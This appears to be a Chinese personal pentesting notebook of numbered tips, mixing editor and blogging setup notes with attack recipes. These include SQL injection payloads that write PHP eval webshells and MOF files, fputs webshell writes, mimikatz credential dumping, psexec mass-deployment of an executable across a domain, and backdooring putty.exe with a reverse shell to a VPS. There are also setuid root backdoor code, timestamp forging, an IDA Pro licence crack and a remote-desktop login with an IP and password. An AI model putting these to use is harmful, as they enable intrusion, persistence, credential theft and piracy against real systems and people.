   2.在burpsuite中用burp自带的十六进制编辑工具将"shell.php .jpg"(中间有空格)中的空格由20改成00
   >
   在1中,url中的%00(形如%xx),web server会把它当作十六进制处理,然后将该十六进制数据hex(00)"翻译"成统一的ascii码值"NUL(null)",实现了截断;
   >
   在2中,burpsuite用burp自带的十六进制编辑工具将"shell.php .jpg"(中间有空格)中的空格由20改成00,如果burp中有二进制编辑工具,
   也可以将"shell.php .jpg"(中间有空格)中的空格由000010 0000(键盘上可控字符space对应的二进制)改成0000 0000(null对应的二进制),
   上传到服务器后,服务器作为一台计算机也会将该处的原来的空格由于被改成截断符后"翻译"成null,实现了截断功能;
   >
   所以在用python(或其它语言)中,要想"写出"截断符(null),
   也就是要写出ascii码值的NUL(null),也就是要由hex(十六进制)下的
   00变成ascii码值,这是语言和解释器以及计算机之间的关系,正如上面的python脚本,
   而php中:
   --------w3c:
   定义和用法
   chr() 函数从指定的 ASCII 值返回字符.
   ASCII 值可被指定为十进制值、八进制值或十六进制值.八进制值被定义为带前置 0,而十六进制值被定义为带前置 0x. 
   --------w3c  (w3c这里的说法把ascii值看作有不同的进制表示形态的各进制值)
   其中chr(61)为=,chr(061)为1,chr(0x61)为a,chr(128)=chr(0x80),chr(255)=chr(0xff)
   script 1:
   <?php
   for($k=0;$k<=255;$k++)
   {
   $a='shell.php'.chr($k)."1.jpg";
   echo 'k:'.$k.'   '.'$a:'.$a.'   '.'iconv("UTF-8","gbk",$a):'.iconv("UTF-8","gbk",$a)."<br>";
   }
   ?>

   其中iconv("UTF-8","gbk",$a)或是iconv("UTF-8","gb2313",$a)都会在chr(128)到chr(255)之间截断,使结果为1,
   而不是1(some char)2,其中128和255为二进制数据表示,此处NUL(nul)(chr(0x00))并不能截断iconv函数,
   而是chr(128)-chr(255),也即chr(0x80)-chr(0xff)截断iconv函数.
   或者用如下代码中hex2asc函数:
   script 2:
   <?php
    
   function asc2hex($str) {  
   return '\x'.substr(chunk_split(bin2hex($str), 2, '\x'),0,-2);  
   } 

    
   function hex2asc($str) {  
   $str = join('',explode('\x',$str));  
   $len = strlen($str);  
   for ($i=0;$i<$len;$i+=2) $data.=chr(hexdec(substr($str,$i,2)));  
   return $data;  
   }  


   for($k=0;$k<256;$k++)
   {
   $a=sprintf("\x%02x",$k);
   echo '$k:'.$k.' ';
   echo '$a:'.$a.' ';
   echo 'hex2asc($a):'.hex2asc($a);
   $file_name="shell.php".hex2asc($a)."1.jpg";
   echo '$file_name:'.$file_name.'  ';
   $file_name=iconv("UTF-8","gb2312",$file_name);
   echo 'iconv("UTF-8","gb2312",$file_name):'.$file_name."<br>";
   }
   /*
   echo hex2asc('\x00');
   */
   ?>
   相同情况下的python脚本为:
   def hex_to_asc(ch):
    return '{:c}'.format(int(float.fromhex(ch)))

   for i in range(256):
    s = '%02x' % i
    print "s:",s,"    ",
    print "hex_to_asc(s):",hex_to_asc(s)
    # print "s:%s,hex_to_asc(s):%s" % (s,hex_to_asc(s))

55.htmlspecialchars的作用是把:
   & (和号) 成为 &
   " (双引号) 成为 "
   ' (单引号) 成为 '
   < (小于) 成为 <
   > (大于) 成为 >   
   输出的时候不需要特殊处理 浏览器 会把这些标签还原的

56.linux命令行下结束firefox进程:
   ps -aux | grep firefox | awk '{if($11=="firefox") print $2}'| xargs kill -9
   pkill firefox
   更强力:
       pkill -9 python

57.菜刀替代工具:Altman
   http://www.i0day.com/1725.html
   https://github.com/keepwn/Altman

58.Pidgin my irc client on linux
    http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux

59.dig mx domain(without www)
   ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short baidu.com ns

60.pwntool:https://www.91ri.org/14382.html

61.vim以十六进制编辑文件:%!xxd
       :%!xxd    --->   :%!xxd -r    --->    :wq
       如果失败则用hexedit编辑
           ctrl+X:save and exit
   vim对比两个文件:vim -d 1.txt 2.txt
   vim自动保存有用版本答案(相当于esc/jk实现保存功能):au InsertLeave * write

62.sublime插件:
    python pep8 autoformat(python代码自动对齐)ctrl+shift+r
    JsFormat(javascript代码自动对齐)ctrl+alt+f

63.linux install node.js&npm   http://www.iteblog.com/archives/1313

64.html内嵌js:
   <html>
   <body>
   <Script Language="JavaScript">
   var a = prompt("\u8f93\u5165\u4f60\u7684\x66\x6c\x61\x67\u5427\uff0c\u5c11\u5e74\uff01", "");
   var b = "\x66\x33\x33\x37\x33\x65\x33\x36\x63\x36\x37\x37\x37\x35\x30\x37\x37\x39\x66\x35\x64\x30\x34\x66\x66\x37\x38\x38\x35\x62\x33\x65";
   var c = /.+_.+_.+/gi;
   var d = 0x0;
   var e = a.substr(0x8, 0x5);
   if ($.md5(e) == b.replace(/7/ig, ++d).replace(/8/ig, d * 0x2)) {
    var f = a.substr(0x0 / d, 0x7);
    if (f.substr(0x5, 0x2) == "\x6a\x73" && $.md5(f.substr(0x0 / d, d + 0x3)) == "\x64\x30\x31\x35\x34\x64\x35\x30\x34\x38\x62\x35\x61\x35\x65\x62\x31\x30\x65\x66\x31\x36\x34\x36\x34\x30\x30\x37\x31\x39\x66\x31") {
      r = a.substr(0xd);
      if (r.charCodeAt(d) - 0x19 == r.charCodeAt(++d) - 0x19 && r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d)) {
        var g = String.fromCharCode(0x4f);
        g = g.toLowerCase() + g.toLowerCase();
        if (r.substr((++d) * 0x3, 0x6) == g.concat("\x65\x61\x73\x79") && c.test(a)) {
          d = String(0x1) + String(a.length)
        }
      }
    }
   };
   if (a.substr(0x4, 0x1) != String.fromCharCode(d) || a.substr(0x4, 0x1) == "\x7a") {
    alert("\u989d\uff0c\u518d\u53bb\u60f3\u60f3\u3002\u3002")
   } else {
    alert("\u606d\u559c\u606d\u559c\uff01")
   }
   </script>
   </body>
   </html>

65.安装requirements.txt中要求的环境:pip install -r requirements.txt

66.python urllib&urllib2:
    http://www.bkjia.com/Pythonjc/1088462.html  Python中http请求方法库汇总,python请求库汇总
    http请求异常处理(获取异常请求的返回内容)
        http://my.oschina.net/duhaizhang/blog/69834
    (爬虫实现http://blog.csdn.net/pleasecallmewhy/article/details/8925978
    http://blog.csdn.net/pleasecallmewhy/article/details/8934726)
    beautifulsoup中文http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html
   0>easyest way
   import urllib2
   response = urllib2.urlopen('http://python.org/')
   html = response.read()

   1>without post
   import urllib2
   req = urllib2.Request('http://www.voidspace.org.uk')
   response = urllib2.urlopen(req)
   the_page = response.read()

   2>post:(要加入 header,data,需要使用 Request 对象)
   import urllib
   import urllib2
   url = 'http://www.someserver.com/cgi-bin/register.cgi'
   values = {'name' : 'Michael Foord',
             'location' : 'Northampton',
             'language' : 'Python' }
   data = urllib.urlencode(values)
   req = urllib2.Request(url, data)
   response = urllib2.urlopen(req)
   the_page = response.read()

67.python使用urllib2容易犯的错误:
　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,
    而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
　　如果设置了chrome的代理如127.0.0.1:8080,事后忘记关闭,则会影响到系统中所有需要联网的程序.
  　urllib2 默认会使用环境变量 http_proxy来设置 HTTP Proxy,如果想在程序中明确控制 Proxy 而不受环境变量的影响,
      可以使用自己设置的代理,可以设置代理为空:

  　null_proxy_handler=urllib2.ProxyHandler({})
  　opener=urllib2.build_opener(null_proxy_handler)
  　urllib2.install_opener(opener)

  　这样就不会出现urllib2　error 101　refused的错误了,也可以将系统的127.0.0.1:8080的代理关掉.(linux中set命令可以看到http_proxy的值,http_proxy并不是vpn的ip)
  　在sublime text中有个sublimeREPL插件,f5快捷键可编译运行python脚本,然而就算系统设置了代理127.0.0.1:8080等,f5依然可以将使用了urllib2且没有加上面３行代码的python脚本
  　成功执行,也许是sublimeREPL中默认的运行代码设置了自己的代理为空,且不影响系统代理http_proxy的值.

68.python,beautifulsoup中正则匹配中文的错误解决办法:
    http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
   python正则表达式:
       http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
       在线正则:
        http://tool.chinaz.com/regex/
       python一般默认贪婪模式(也即尽量往长度多的结果匹配),变成非贪婪方法:
            *?      使*变成非贪婪模式
            +?      使+变成非贪婪模式
            ??      使?变成非贪婪模式
            {m,n}?  使{m,n}变成非贪婪模式
       正则表达式 – 运算符优先级
            http://wp.huangshiyang.com/regexp

            匹配不包含...
            http://www.jb51.net/article/52491.htm

            前向界定|后向界定|前向非界定|后向非界定
            http://blog.csdn.net/smilelance/article/details/6529950

       匹配除\n以外的所有空白字符
           [^\S\n]
           原来想这样:[\s[^\n]]
           还有这样:[\s(?<!\n)]
           结果都不可以,正则的存在需要多多口味,存在\s\S,\w\W,\d\D的现象不是随便就存在的,简单的逻辑组合就可成为强大的匹配利器

       一句话将python2中的print转成python3中的print:
            http://stackoverflow.com/questions/22590183/regex-vim-for-print-to-print-for-python2-to-python3
        in vim:
        :%s/^\(\s*print\)\s\+\(.*\)/\1(\2)

        in shell:
        2to3 -f print -w file.py

        python2--->python3:
        1>2to3 file.py(2to3 -w file.py)(2to3 -f print -w file.py)(man 2to3)
        2>python -3 file.py

69.python中获得执行系统命令的输出:http://blog.csdn.net/g457499940/article/details/17068277

70.python代码中不能有~符号当作/root目录的习惯,open('~/something','r+')会出错,os.system('~/something')不会,
    为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些
    函数,eg.a='python /root/%s' % input(),os.system(a)

71.ida pro中graph功能失败,could not find grapher 'qwingraph.exe'.please check GRAPH_VISUALIZER in ida.cfg
    解决方法http://blog.csdn.net/qysh123/article/details/17590731

72.sqlmap跑出有如
   Payload: 8.8.8.8' AND 3588=3588-- RMEo
   的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of
   database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,比如SQLite,这个时候如果同意忽
   略其他数据库类型的检测,会发现sqlmap按照MySQL的注入语法跑不出什么结果,database:none.同理,在一般sqlmap使用过程
   中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite参数,成功跑出目标SQLite数据
   库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多
   跑几次就出来了.

73.preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo "${@phpinfo()}";就可以了,不必
    echo "{${phpinfo()}}";

74.vim配置:
          https://github.com/xinghuacai/spf13-vim
          http://blog.csdn.net/namecyf/article/details/7787479
          https://github.com/Valloric/YouCompleteMe
            安装YouCompleteMe编译时在运行:
            cd ~/.vim/bundle/YouCompleteMe
            ./install.py --clang-completer
            可参考https://github.com/numba/llvmlite/issues/282,手动下载对应的tar.xz文件放到
            /Users/3xp10it/.vim/bundle/YouCompleteMe/third_party/ycmd/clang_archives目录下
          https://github.com/VundleVim/Vundle.vim#about
          windows gvim配置:
            http://www.oschina.net/code/snippet_561596_17292
   vimscript编程
       https://kenvifire.gitbooks.io/vimscript/content/22.html
   vim模拟按键:
        https://zenbro.github.io/2015/07/19/simulate-a-keypress-in-vim-insert-mode.html
        https://groups.google.com/forum/#!topic/vim_use/omBYbaeyAo8
        https://superuser.com/questions/277051/how-can-i-emulate-key-presses-on-vim-startup
        http://stackoverflow.com/questions/9445273/how-do-i-emulate-a-keypress-inside-a-vim-function
   python操作vim
      http://top.jobbole.com/15078/
   python编写vim插件
       http://note.axiaoxin.com/contents/write-vim-plugin-by-python.html
       http://ningning.today/2017/01/26/python/use-python-write-vim-plugin/
       http://www.webtag123.com/python/44462.html
       https://www.oschina.net/translate/how-to-write-vim-plugins-with-python
   vim中F5编译运行py文件:
   1>http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
                           把function添加在_vimrc的前边,不要放在最后:
                           function CheckPythonSyntax()
                               let mp = &makeprg
                               let ef = &errorformat
                               let exeFile = expand("%:t")
                               setlocal makeprg=python\ -u
                               set efm=%C\ %.%#,%A\ \ File\ \"%f\"\\,\ line\ %l%.%#,%Z%[%^\ ]%\\@=%m
                               silent make %
                               copen
                               let &makeprg     = mp
                               let &errorformat = ef
                           endfunctio
   
                           然后添加:
                           map <F5> :call CheckPythonSyntax()<CR>
                         2>在vimrc文件中加nnoremap <buffer> <F9> :exec '!python' shellescape(@%, 1)<cr>(1更好)
    vim进阶:http://coolshell.cn/articles/5426.html

    vim tips:
        1.s和x的区别,s是delete+insert,x是delete

    my tmux配置:
        注意新版本tmux配置要变化
        https://github.com/tmux/tmux/issues/754

		step1.
        https://github.com/tmux/tmux     安装最新版本
		step2.
		https://github.com/3xp10it/.tmux/blob/master/README.md

		Or:

        https://github.com/gpakosz/.tmux 安装比较好的配置
        echo $EDITOR
        export EDITOR=vim
        echo $EDITOR
        http://blog.csdn.net/g1036583997/article/details/50466499    tmux复制模式
        http://cenalulu.github.io/linux/tmux/

    ubuntu安装Oh-My-Zsh:
        https://zhuanlan.zhihu.com/p/19556676
        http://www.jianshu.com/p/9a5c4cb0452d

    macOS当用户名不是root时使用非系统自带的zsh方法
    https://stackoverflow.com/questions/453236/how-to-set-my-default-shell-on-mac
    brew install zsh
    chsh -s `which zsh`
    vim /etc/shells + /usr/local/bin/zsh(这是which zsh的结果)
    重启终端
    
    

75.1>dmz+光猫+有线路由+无线路由下的端口映射:
   2>拓扑图大致为:
          光猫(192.168.1.1)
           ｜
        有线路由
           ｜        
        无线路由(192.168.3.1)
           ｜        
          内网(192.168.3.x)
   3>其中光猫含有路由器功能,此处有线路由相当于集线器功能
   4>如果在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4(此ip可在无线路由的wan口所在ip值看到,
        此ip值由光猫上的dhcp随机分配)
   5>wan口和lan口区别:>每个路由器有wan口和lan口,光猫拨号,其wan口ip为internet接口所在ip,一般为动态获取的一个值,其lan口ip为192.168.1.1(此ip可在光猫上人工设置成任意192.168.x.1形式)
                  　>无线路由的wan口ip为光猫所在局域网的ip段中的ip:192.168.1.4,lan口ip为192.168.3.1(此ip可在无线路由器上人工设置成任意192.168.x.1形式)
   6>不加dmz时的内网端口映射:光猫上设置nat:将外部数据转到192.168.1.4及对应端口,无线路由器上设置nat:将外部数据转
     到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口
   7>加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将
        外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到
     无线路由器上,外部访问光猫公网ip即相当于访问无线路由)

76.内网渗透 代理&转发 http://www.heysec.org/archives/115
	当reGeory无法成功时,reGeorg替代工具
	https://github.com/nccgroup/ABPTTS

77.union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'-- - (路径中用/不用\)
   写一句话是select 1,2,3,4,<?php @eval($_POST[cmd]);?>,6 into outfile 'c:/ksla/lsd/'-- -　　　　
   (outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
   mysql中phpmyadmin提权:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
   udf:http://www.cnblogs.com/qing123/p/4676808.html
   outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
   在phpmyadmin中
   windows系统在phpmyadmin的web后台写文件时写成into dumpfile 'c:\www\some\1.php'无法写入时,改成into dumpfie 'c:\\www\\some\\1.php'
   SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　'/phpstudy/www/121.txt'    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
   select unhex('...') into dumpfile 'c:/inetpub/wwwroot/memberinfo/....php';-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
   同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex('3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E') into dumpfile 'C:/AAWServer/www/php/k82.php';

78.有时候visual studio2015或其它版本的ide编译出来的exe文件无法在其它机器上运行(release版本也不可以的时候)可以直接试试g++/gcc -o out.exe file.cpp等命令自行编译.

79.ctrl+shift+p==>install==>package syning,backup sublime settings==>https://github.com/csch0/SublimeText-Package-Syncing

80.http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读

81.windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
    cacls h:/temp /t /e /c /g wzj9999:f

82.php写shell: cmd=fputs(fopen('chk.php','w'),'<?php @eval($_POST[nihao]); ?>');
   其中nihao的位置不能有''或"",而且fputs的第二个参数只能用单引号包住

83.rdesktop -u administrator -p nihao103.240.203.6:3389

84.到最外面调时间,拉到中间没到最外面调星期和日期(中间时,顺时针调星期,逆时针调  
   日期)

85.windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
   load  mimikatz
   mimikatz_command -f sekurlsa::searchPasswords
   在mimikatz抓密码时,nishang中的ps1脚本不好用时,直接用原版的mimikatz.exe
    -slave 103.240.203.6 200  202.177.192.16 3389
    local:-listen 

    mimikatz更多用法:
    http://www.07net01.com/2016/02/1280295.html

86.sa权限上传文件九种方法:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm

87.内网渗透:
    http://www.pojie567.com/blog/?post=5186
    http://www.1990day.com/regeorg-proxychains-gold-partner/
    http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
    http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
    https://www.91ri.org/tag/neiwang-hacker
    http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
    http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
    http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\kav\2009.exe
    (第一次运行psexec.exe可以带/accepteula参数防止弹出确定的界面)
    http://drops.wooyun.org/tips/12021   拿下域控权限
   快速找出dc:
            dsquery server(best)
            nslookup -type=SRV _ldap._tcp.baidu.com
            netdom query fsmo
            net group "domain controllers" /domain

88.ipc$:http://www.cnblogs.com/lhws/p/4024208.htm

89.github pages+jekyll搭建个人博客:
        https://www.zhihu.com/question/20223939
        https://github.com/jacobtomlinson/carte-noire
        http://www.tuicool.com/articles/RZbEV3
        https://help.github.com/articles/configuring-jekyll/
        https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/
        http://jekyllrb.com/docs/github-pages/#project-page-url-structure
        http://jekyllcn.com/
        https://learnetto.com/blog/tutorial-how-to-host-your-websites-for-free-using-github-pages
        http://pikipity.github.io/blog/kramdown-syntax-chinese-1.html   kramdown语法
        http://pikipity.github.io/blog/kramdown-syntax-chinese-2.html   kramdown语法
        http://platinhom.gitcafe.io/2015/11/06/Kramdown-note/           kramdown语法
        https://ruby-china.org/topics/14005                             web中文字体应用指南(i use 文泉驿等宽正黑 )
        http://platinhom.github.io/2015/06/06/Markdown-note/
        http://xinghuacai.github.io
        http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
        myblog/posts-by-categories.html                                 jekyll archive by categories
        http://www.ithome.com/html/it/195970.htm                        add music to my pages

90.kali2.0使用pptp vpn时,需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位),否则不能成功连接,另外,用不了l2tp vpn,不知系统哪里的问题

91.https://ghostbin.com/  :-> paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
                                                             from:
                                                             http://drops.wooyun.org/pentesting/15117

92.kali2安装rime输入法:
https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
       https://wu.nerd.moe/?p=1752
       /usr/bin/rime_dict_manager自带词库管理工具
            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
            windows:%appdata%\rime\wubi86.userdb.kct
       http://www.jianshu.com/p/cffc0ea094a7
       https://github.com/rime/home/wiki/CustomizationGuide
       重新部署使配置生效:--->    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx

       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1>/dev/null 2>/dev/null &;nohup sogou-qimpanel  1>/dev/null 2>/dev/null &
       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
       eg.my default.custom.yaml file:
       ---------------------start------------------------
            patch:
                menu/page_size: 9
                schema_list:
                  - schema: luna_pinyin
                  - schema: luna_pinyin_fluency
                  - schema: luna_pinyin_simp
                  - schema: wubi_pinyin
                  - schema: wubi86
                  - schema: emoji
                ascii_composer:
                  good_old_caps_lock: true
                  switch_key:
                    Caps_Lock: clear
                    Control_L: noop
                    Control_R: commit_text
                    Eisu_toggle: clear
                    Shift_L: commit_code
                    Shift_R: inline_ascii
      --------------------end----------------------------
windows中rime词库文件位置:%APPDATA%\rime
深蓝词库转换工具:
    https://github.com/studyzy/imewlconverter
    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html

93.windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&form=MSHOME

94.backdoor-factory用法:
    1.单独的backdoor-factory:
        backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
        backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
        backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former 'show' command) -H vps's ip -P 200
    2.backdoor-factory in veil:-->veil-->list-->number of native/backdoor-factory-->options-->set the options

95.aspx大马连接报错"/"解决方法:http://www.asp-muma.com/?post=97
   my way defferent from uppon one:
   create a new folder,create a web.config file with below content:
   --------------------------content------------------------
    <configuration>
        <system.web>
            <customErrors mode="Off"/>
        </system.web>
    </configuration>
   --------------------------end of content----------------
   then upon a strong webshell to my new created folder,found no more error.

96.百度云上传限制绕过:
   windows:
        copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
   linux:
        echo niaho >> 1.rmvb

97.windows中ping google && ping baidu ==>ping.bat:
                                         cmd /k "ping www.google.com.hk && ping www.baidu.com"
   创建ping.bat文件的快捷方式,在快捷方式中添加快捷键.eg.ctrl+alt+p

98.linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128

99.booklist:http://www.jianshu.com/p/67e294106919

100.gdb:http://www.jianshu.com/p/f20b10ea9a61

101.study links:
    http://www.shiyanbar.com/questions/733
    http://ch3rish.lofter.com/post/1d503b96_791362d

102.linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
    find / -type f -perm -4000 -ls > tmp.txt   function:find suid files
        find / -type f -perm -4000 -ls | grep "flag00" > tmp.txt    function:find file has setuid=flag00
    find / -type f -perm -2000 -ls > tmp.txt   function:find sgid files
    find / -perm -2 -type f -print             function:find files can be writeable by everyone
        echo "/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh" >> writeable_file_if_it_is_from_any_autorun_directory
        /tmp/.sh -p(this command to get a euid=root shell)

103.linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print

104.one linux backdoor shell can be like this:(file.c)
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdio.h>
    
    int main(int argc, char **argv, char **envp)
    {
        gid_t gid;
        uid_t uid;
        gid = getegid();
        uid = geteuid();
    
        setresgid(gid, gid, gid);
        setresuid(uid, uid, uid);
    
        system("/usr/bin/env echo && echo runtime error.");
    }

    to use this file as a root shell backdoor after got a root shell,
    use root role execute:
        gcc -o 1 file.c
        mv 1 /bin/l2ping
        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
    use webshell role execute:
        PATH=/tmp:$PATH
        export PATH
        echo $PATH(to check if /tmp is in $PATH)
        ln -s /bin/sh /tmp/echo
    then use webshell role to get a root privilege shell:
        /bin/l2ping

105.linux中修改文件时间
    同时修改文件的修改时间和访问时间
    touch -d "2010-05-31 08:10:30" test.doc

106.rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启

107.ssh文件复制:eg.本机未登录前执行
        scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote->local)
        scp /tmp.txt level08@192.168.2.140:/home/level08/                (local->remote)

108.echo 'ibase=16;410' | bc 
        16进制的410转换成默认10进制:out->1040
    echo 'ibase=16;obase=2;410' | bc
        16进制的410转换成2进制:out->10000010000

109.python中ord和int:
    int('12')=12
    int('b')=error(int的参数只能是'num'类型)
    ord('b')=98
    ord('a')=97
    ord('0')=48
    ord('ascii')=ascii这一个字符对应的十进制整数(ascii只能是a character,not string)

110.书单
        http://www.heysec.org/archives/257
        https://www.zhihu.com/question/24152689
        http://m.blog.csdn.net/article/details?id=45482849

111.linux上ssh无法以root用户登录解决方法:
    vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
    /PermitRootLogin<Enter>
    change to:
        PermitRootLogin yes

    macOS快速开启ssh服务:
    systemsetup -getremotelogin
    systemsetup -setremotelogin on

112.gcc编译so文件:
        gcc -shared -fPIC myfile.c -o myfile.socc

113.wordpress 渗透工具
    1.wpscan
    2.http://www.getwpxf.com/  seems better
    3.youtube:how to hack wordpress

114.linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/

115.一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
    一个汉字是2个字符4个字节32位,4 bytes,32 bits
    一个DWORD则是4个字符8个字节64位,8 bytes,64 bits

116.linux安装程序
    cd program
    ./configure
    make
    sudo make install

117.linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,
    否则本地编译出exploit文件后上传到对方机器运行时会出现can not execute binary file的错误

118.访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,
    但是404显示目录下的文件还是可以正常访问的

119.c_++头:
        using namespace std;
        #include <iostream>

120.ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,
    然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前

121.ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.

122.html中的图标    http://fontawesome.io/icons/

123.fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm

124.html转pdf:
    wkhtmltopdf www.myhomepage.com myhomepage.pdf
    在线pdf编辑 http://www.pdfescape.com/
    本地pdf快速转换:chrome浏览器(全选或部分选择后)右键可打印成pdf

    md转pdf/html
    sublime text 安装markdown preview插件

125.printf("%x"):第一个栈里的值
    printf("%3x"):第一个栈里的值,用3个字节长度表示
    printf("%3\$x"):第三个栈里的值(这一条适用于绝大多数的*nix的系统,
    win下不支持则用printf("%x,%x,%x")来达到同样的目的)
    宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值

126.visual studio快速编译一个c文件
    运行C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\Tools\VsDevCmd.bat
    然后运行cl md.c
    或者打开tools里面的开发人员提示符,然后再cl md.c

127.安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其
    他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和
    pcapy用管理员身份安装

128.sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成
    os.startfile或subprocess中的popen os.startfile(相当于双击操作,eg. os.startfile("1.txt")):
        http://blog.sina.com.cn/s/blog_4b5039210100froh.html

129.my_sulley学习资料
    http://pan.baidu.com/s/1c1Y6kVY


131.github在push时免输入用户名密码:
    http://www.cnblogs.com/ballwql/p/3462104.html

132.mysql中表名为关键字的处理方法,`table_name`
    http://www.cnblogs.com/puzi0315/archive/2012/08/27/2658169.html

133.windows截图神器Snipaste
    http://zh.snipaste.com/

134.windows下rime修改备选词个数:打开default.yaml,修改对应数字

135.ranger:linux terminal file manage god software

136.github pages生成的博客本地有语法高亮而正常http://3xp10it.github.io没有语法高亮的原因:
	(最近一次导致部分页面没有完全https传输是因为多说的登录后的头像在评论区中的url为http,这个好像无法更改,不登录
	多说即可,因为登录后头像会变成http://....,而不登录的头像为https://...)
    由于github将博客升级成http://3xp10it.github.io,而本地浏览器访问http://3xp10it.github.io时,出于安全性考虑,
    禁用了js,本地生成的博客为http://127.0.0.1:4000,没有https
    解决办法:https://help.github.com/articles/securing-your-github-pages-site-with-https/
        将博客文件夹中的https变成http
        (后来好像是只要把css文件中的http变成https就可以?)
